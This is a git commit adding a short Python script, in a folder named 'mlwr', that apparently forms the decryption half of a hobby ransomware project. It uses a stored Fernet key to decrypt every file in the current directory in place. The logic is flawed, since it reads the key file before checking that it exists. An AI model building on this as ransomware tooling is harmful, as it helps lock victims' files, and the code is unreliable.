a57cf87ee6c389cb707db902ce6b45b412abafe1
zcklab <otonielhenrique@icloud.com>
2024-03-24 11:58:59 -0300

    mlwr

---
+++ mlwr/guhb.py
@@ -0,0 +1,31 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+with open("chave.key", "rb") as key:
+    secretkey = key.read()
+
+# Verifica se já existe a chave e a carrega, ou a gera e salva
+if os.path.exists("chave.key"):
+    with open("chave.key", "rb") as chave:
+        key = chave.read()
+else:
+    key = Fernet.generate_key()
+    with open("chave.key", "wb") as chave:
+        chave.write(key)
+
+cipher = Fernet(key)
+
+for file in os.listdir():
+    if file == "main.py" or file == "chave.key" or file == "mlwr.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+for file in files:
+    with open(file, "rb") as arquivo:
+        conteudo = arquivo.read()
+        conteudo_decrypted = cipher.decrypt(conteudo)
+        with open(file, "wb") as arquivo:
+            arquivo.write(conteudo_decrypted)
